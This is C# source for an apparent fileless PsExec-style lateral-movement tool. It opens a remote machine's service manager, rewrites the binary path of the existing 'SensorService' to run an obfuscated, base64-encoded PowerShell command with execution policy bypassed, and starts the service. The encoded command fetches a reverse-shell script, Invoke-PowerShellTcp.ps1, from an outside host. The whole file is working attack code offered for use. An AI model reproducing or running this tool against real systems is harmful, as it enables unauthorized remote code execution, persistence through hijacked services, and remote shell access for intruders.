using System;
using System.Runtime.InteropServices;

namespace FilelessPsExec
{
    internal class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(
            string machineName,
            string databaseName,
            uint dwAccess);

        const uint SC_MANAGER_ALL_ACCESS = 0xF003F;

        [DllImport("advapi32.dll", EntryPoint = "OpenServiceA", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr OpenService(
            IntPtr hSCManager,
            string lpServiceName,
            uint dwDesiredAccess);

        const uint SERVICE_ALL_ACCESS = 0xF01FF;

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(
            IntPtr hService,
            uint dwServiceType,
            int dwStartType,
            int dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            string lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword,
            string lpDisplayName);

        const uint SERVICE_NO_CHANGE = 0xFFFFFFFF;
        const int SERVICE_DEMAND_START = 0x3;

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(
            IntPtr hService,
            int dwNumServiceArgs,
            string[] lpServiceArgVectors);

        static void Main(string[] args)
        {
            string machineName = args[0];
            IntPtr hSCManager = OpenSCManager(machineName, null, SC_MANAGER_ALL_ACCESS);

            string lpServiceName = "SensorService";
            IntPtr hService = OpenService(hSCManager, lpServiceName, SERVICE_ALL_ACCESS);

            bool res = ChangeServiceConfigA(hService,
                SERVICE_NO_CHANGE,
                SERVICE_DEMAND_START,
                0,
                "C:\\Windows\\System32\\cmd.exe /c \"powershell.exe -nop -exec bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMwA2AC4AMQAyADgALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA\"",
                null, null, null, null, null, null);

            if (res)
                StartService(hService, 0, null);
        }
    }
}